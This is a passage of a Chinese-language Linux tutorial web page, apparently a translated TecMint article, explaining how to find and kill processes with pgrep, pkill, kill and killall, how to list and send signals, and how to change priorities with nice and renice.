class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tecmint </span><span class=\"crayon-i\">top</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14983848837661-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pgrep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tecmint </span><span class=\"crayon-i\">glances</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14983848837661-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pkill </span><span class=\"crayon-i\">glances</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14983848837661-6\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pgrep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tecmint </span><span class=\"crayon-i\">glances</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14983848837661-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093038u3hxhdtwzj8iz38j.png\" alt=\"控制 Linux 进程\"></p>\n<p><em>控制 Linux 进程</em></p>\n<p>想要深入了解如何使用这些命令，在 Linux 中杀死/终止活跃进程，可以点击下面的链接：</p>\n<ol>\n<li><a href=\"http://www.tecmint.com/how-to-kill-a-process-in-linux/\">终止 Linux 进程的 Kill、Pkill 和 Killall 命令指南</a></li>\n<li><a href=\"http://www.tecmint.com/find-and-kill-running-processes-pid-in-linux/\">如何在 Linux 中查找并杀死进程</a></li>\n</ol>\n<p>注意当你系统僵死freeze时你可以使用它们杀死 <a href=\"http://www.tecmint.com/kill-processes-unresponsive-programs-in-ubuntu/\">Linux 中的不响应程序</a>。</p>\n<h4 id=\"toc_18\">给进程发送信号</h4>\n<p>Linux 中控制进程的基本方法是给它们发送信号。你可以发送很多信号给一个进程，运行下面的命令可以查看所有信号：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14987562063093\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ kill -l\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14987562063093-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14987562063093-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14987562063093-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14987562063093-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093038dn9ll1v2xs4cln7c.png\" alt=\"列出所有 Linux 信号\"></p>\n<p><em>列出所有 Linux 信号</em></p>\n<p>要给一个进程发送信号，可以使用我们之前提到的 <code>kill</code>、<code>pkill</code> 或 <code>pgrep</code> 命令。但只有被编程为能识别这些信号时程序才能响应这些信号。</p>\n<p>大部分信号都是系统内部使用，或者给程序员编写代码时使用。下面是一些对系统用户非常有用的信号：</p>\n<ul>\n<li>SIGHUP 1 – 当控制它的终端被被关闭时给进程发送该信号。</li>\n<li>SIGINT 2 – 当用户使用 <code>Ctrl+C</code> 中断进程时控制它的终端给进程发送这个信号。</li>\n<li>SIGQUIT 3 – 当用户发送退出信号 <code>Ctrl+D</code> 时给进程发送该信号。</li>\n<li>SIGKILL 9 – 这个信号会马上中断（杀死）进程，进程不会进行清理操作。</li>\n<li>SIGTERM 15 – 这是一个程序终止信号（kill 默认发送这个信号）。</li>\n<li>SIGTSTP 20 – 它的控制终端发送这个信号给进程要求它停止（终端停止）；通过用户按 <code>Ctrl+Z</code> 触发。</li>\n</ul>\n<p>下面是当 Firefox 应用程序僵死时通过它的 PID 杀死它的 kill 命令事例：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d1498c103018149\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pidof firefox\r\n$ kill 9 2687\r\n或\r\n$ kill -KILL 2687\r\n或\r\n$ kill -SIGKILL 2687  \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d1498c103018149-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d1498c103018149-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d1498c103018149-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d1498c103018149-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d1498c103018149-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d1498c103018149-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d1498c103018149-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d1498c103018149-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pidof </span><span class=\"crayon-i\">firefox</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d1498c103018149-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2687</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d1498c103018149-3\">或</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d1498c103018149-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">KILL</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2687</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d1498c103018149-5\">或</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d1498c103018149-6\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">SIGKILL</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2687</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594bd57d1498c103018149-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>使用它的名称杀死应用，可以像下面这样使用 pkill 或 killall：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14992432000020\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pkill firefox\r\n$ killall firefox \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14992432000020-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14992432000020-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14992432000020-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14992432000020-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pkill </span><span class=\"crayon-i\">firefox</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14992432000020-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">killall </span><span class=\"crayon-i\">firefox</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14992432000020-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h4 id=\"toc_19\">更改 Linux 进程优先级</h4>\n<p>在 Linux 系统中，所有活跃进程都有一个优先级以及 nice 值。有比点优先级进程有更高优先级的进程一般会获得更多的 CPU 时间。</p>\n<p>但是，有 root 权限的系统用户可以使用 <code>nice</code> 和 <code>renice</code> 命令影响（更改）优先级。</p>\n<p>在 top 命令的输出中， NI 显示了进程的 nice 值：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14996457315416\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ top  \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14996457315416-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14996457315416-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14996457315416-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">top</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14996457315416-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093037zssr5b6tqnqnx6c2.png\" alt=\"列出 Linux 正在运行的进程\"></p>\n<p><em>列出 Linux 正在运行的进程</em></p>\n<p>使用 <code>nice</code> 命令为一个进程设置 nice 值。记住一个普通用户可以给他拥有的进程设置 0 到 20 的 nice 值。</p>\n<p>只有 root 用户可以使用负的 nice 值。</p>\n<p>要重新设置一个进程的优先级，像下面这样使用 <code>renice</code> 命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d1499a350858735\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ renice +8  2687\r\n$ renice +8  2103\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d1499a350858735-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d1499a350858735-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d1499a350858735-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d1499a350858735-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">renice</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2687</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d1499a350858735-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">renice</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2103</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d1499a350858735-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>阅读我们其它如何管理和控制 Linux 进程的有用文章。</p>\n<ol>\n<li><a href=\"http://www.tecmint.com/rhcsa-exam-boot-process-and-process-management/\">Linux 进程管理：启动、停止以及中间过程</a></li>\n<li><a href=\"http://www.tecmint.com/find-processes-by-memory-usage-top-batch-mode/\">使用 ‘top’ 命令 Batch 模式查找内存使用最高的 15 个进程</a></li>\n<li><a href=\"http://www.tecmint.com/find-linux-processes-memory-ram-cpu-usage/\">在 Linux 中查找内存和 CPU 使用率最高的进程</a></li>\n<li><a href=\"http://www.tecmint.com/find-process-name-pid-number-linux/\">在 Linux 中如何使用进程 ID 查找进程名称</a></li>\n</ol>\n<p>就是这些！如果你有任何问题或者想法，通过下面的反馈框和我们分享吧。</p>\n<p>（题图：Pixabay，CC0）</p>\n<hr>\n<p>作者简介：</p>\n<p>Aaron Kili 是一个 Linux 和 F.O.S.S（Free and Open-Source Software） 爱好者，一个 Linux 系统管理员、web 开发员，现在也是 TecMint 的内容创建者，他喜欢和电脑一起工作，他相信知识共享。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111053\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111053votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111053\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 12 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093035wd0ly8pppjc0fo8o.png"], "fav_nums": 12, "comment_nums": 0, "create_date": "2017/05/01", "praise_nums": 2}
